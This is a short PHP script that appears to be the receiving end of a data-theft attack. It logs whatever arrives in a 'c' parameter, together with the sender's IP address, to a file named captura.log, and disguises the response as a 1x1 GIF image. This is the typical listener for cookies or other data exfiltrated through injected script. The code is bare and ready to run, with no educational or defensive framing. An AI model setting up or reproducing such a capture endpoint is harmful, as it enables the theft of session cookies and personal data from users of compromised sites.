<?php
$c = $_GET['c'] ?? $_POST['c'] ?? '';
if ($c !== '') {
    $linea = date('Y-m-d H:i:s') . ' | origen=' . ($_SERVER['REMOTE_ADDR'] ?? '') . ' | datos=' . $c . PHP_EOL;
    file_put_contents(__DIR__ . '/logs/captura.log', $linea, FILE_APPEND);
}
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBTAA7');
